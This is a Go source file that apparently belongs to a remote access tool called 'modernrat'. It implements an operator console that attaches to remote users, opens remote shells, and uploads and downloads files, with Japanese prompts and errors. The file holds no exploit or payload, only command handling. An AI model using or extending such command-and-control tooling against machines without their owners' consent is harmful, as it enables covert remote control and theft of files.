package main

import (
	"context"
	"errors"
	"fmt"
	"io"
	"path/filepath"
	"strings"

	pb "modernrat-client/gen"
)

type adminApp struct {
	ctx          context.Context
	adminClient  pb.AdminServiceClient
	shellClient  pb.RemoteShellServiceClient
	fileClient   pb.FileTransferServiceClient
	token        string
	defaultUser  string
	attachedUser string
	listFilter   string
	listPageSize int
}

var errCommandExit = errors.New("exit command requested")

func (a *adminApp) run() error {
	fmt.Println("Type 'help' for a list of commands.")

	for {
		select {
		case <-a.ctx.Done():
			return a.ctx.Err()
		default:
		}

		prompt := "modernrat"
		if a.attachedUser != "" {
			prompt += fmt.Sprintf("(%s)", shortUserID(a.attachedUser))
		}
		prompt += "> "

		line, err := readLine(prompt)
		if err != nil {
			if errors.Is(err, io.EOF) {
				return nil
			}
			if errors.Is(err, context.Canceled) {
				return err
			}
			return err
		}

		if strings.TrimSpace(line) == "" {
			continue
		}

		args, err := parseArguments(line)
		if err != nil {
			fmt.Printf("入力の解析に失敗しました: %v\n", err)
			continue
		}
		if len(args) == 0 {
			continue
		}

		cmd := strings.ToLower(args[0])
		if err := a.executeCommand(cmd, args[1:]); err != nil {
			if errors.Is(err, errCommandExit) {
				return nil
			}
			if errors.Is(err, context.Canceled) {
				return err
			}
			if errors.Is(err, io.EOF) {
				return nil
			}
			fmt.Printf("エラー: %v\n", err)
		}
	}
}

func (a *adminApp) executeCommand(cmd string, args []string) error {
	switch cmd {
	case "help", "?":
		printHelp()
		return nil

	case "attach":
		if len(args) < 1 {
			return errors.New("attach コマンド: attach <user_id>")
		}
		userID := strings.TrimSpace(args[0])
		if userID == "" {
			return errors.New("ユーザーIDを指定してください")
		}
		a.attachedUser = userID
		a.defaultUser = userID
		fmt.Printf("Attached to user %s\n", userID)
		return nil

	case "detach":
		if a.attachedUser == "" {
			fmt.Println("現在 attach しているユーザーはありません")
			return nil
		}
		fmt.Printf("Detached from user %s\n", a.attachedUser)
		a.attachedUser = ""
		return nil

	case "session", "sessions", "status":
		if a.attachedUser == "" {
			fmt.Println("未 attach")
		} else {
			fmt.Printf("Attached user: %s\n", a.attachedUser)
		}
		return nil

	case "shell":
		userArg := ""
		if len(args) > 0 {
			userArg = args[0]
		}
		userID, err := a.resolveUser(userArg)
		if err != nil {
			return err
		}
		if err := a.runShell(userID); err != nil {
			if errors.Is(err, context.Canceled) || errors.Is(err, io.EOF) {
				return nil
			}
			return err
		}
		a.attachedUser = userID
		a.defaultUser = userID
		return nil

	case "upload":
		userOverride, positional, err := extractUserFlag(args)
		if err != nil {
			return err
		}
		if len(positional) < 1 {
			return errors.New("upload コマンド: upload <local_path> [remote_path] [--user <user_id>]")
		}
		localPath := positional[0]
		expandedLocalPath, err := expandLocalPath(localPath)
		if err != nil {
			return err
		}
		localPath = expandedLocalPath
		remotePath := ""
		if len(positional) >= 2 {
			remotePath = positional[1]
		}
		userID, err := a.resolveUser(userOverride)
		if err != nil {
			return err
		}
		if remotePath == "" {
			remotePath = filepath.Base(localPath)
		}
		if remotePath == "" {
			return errors.New("保存先パスを決定できません")
		}
		if err := a.performUpload(userID, localPath, remotePath); err != nil {
			return err
		}
		a.attachedUser = userID
		a.defaultUser = userID
		return nil

	case "download":
		userOverride, positional, err := extractUserFlag(args)
		if err != nil {
			return err
		}
		if len(positional) < 1 {
			return errors.New("download コマンド: download <remote_path> [local_path] [--user <user_id>]")
		}
		remotePath := positional[0]
		localPath := ""
		if len(positional) >= 2 {
			localPath = positional[1]
		}
		userID, err := a.resolveUser(userOverride)
		if err != nil {
			return err
		}
		if localPath == "" {
			localPath = filepath.Base(remotePath)
		}
		if localPath != "" {
			expandedLocalPath, err := expandLocalPath(localPath)
			if err != nil {
				return err
			}
			localPath = expandedLocalPath
		}
		if localPath == "" {
			return errors.New("保存先ファイル名を決定できません")
		}
		if err := a.performDownload(userID, remotePath, localPath); err != nil {
			return err
		}
		a.attachedUser = userID
		a.defaultUser = userID
		return nil

	case "list", "users":
		if len(args) > 0 {
			a.listFilter = strings.Join(args, " ")
		}
		return a.listUsers()

	case "clear":
		fmt.Print("\033[H\033[2J")
		return nil

	case "quit", "exit", "q":
		return errCommandExit

	default:
		return fmt.Errorf("未知のコマンドです: %s (help 参照)", cmd)
	}
}

func (a *adminApp) resolveUser(userOverride string) (string, error) {
	if v := strings.TrimSpace(userOverride); v != "" {
		return v, nil
	}
	if a.attachedUser != "" {
		return a.attachedUser, nil
	}
	if a.defaultUser != "" {
		return a.defaultUser, nil
	}
	return "", errors.New("ユーザーを指定してください (attach <user_id> または --user <user_id>)")
}

func extractUserFlag(args []string) (string, []string, error) {
	var (
		userOverride string
		positional   []string
	)

	for i := 0; i < len(args); {
		arg := args[i]
		switch {
		case arg == "--user":
			if i+1 >= len(args) {
				return "", nil, errors.New("--user フラグにはユーザーIDが必要です")
			}
			if userOverride != "" {
				return "", nil, errors.New("--user フラグは一度のみ指定できます")
			}
			userOverride = strings.TrimSpace(args[i+1])
			i += 2
		case strings.HasPrefix(arg, "--user="):
			if userOverride != "" {
				return "", nil, errors.New("--user フラグは一度のみ指定できます")
			}
			userOverride = strings.TrimSpace(strings.TrimPrefix(arg, "--user="))
			i++
		default:
			positional = append(positional, arg)
			i++
		}
	}

	return userOverride, positional, nil
}

func printHelp() {
	fmt.Println("利用可能なコマンド:")
	fmt.Println("  help                    - このヘルプを表示")
	fmt.Println("  attach <user_id>        - 指定ユーザーに attach")
	fmt.Println("  detach                  - 現在の attach を解除")
	fmt.Println("  status                  - attach 状態を表示")
	fmt.Println("  list [filter]           - ユーザー一覧 (ページング対応)")
	fmt.Println("  shell [user_id]         - リモートシェルを起動 (:upload/:download 利用可)")
	fmt.Println("  upload <local> [remote] [--user <id>]   - ファイルをアップロード")
	fmt.Println("  download <remote> [local] [--user <id>] - ファイルをダウンロード")
	fmt.Println("  clear                   - 画面をクリア")
	fmt.Println("  exit                    - 終了")
}

func shortUserID(userID string) string {
	userID = strings.TrimSpace(userID)
	if len(userID) <= 8 {
		return userID
	}
	return userID[:8]
}
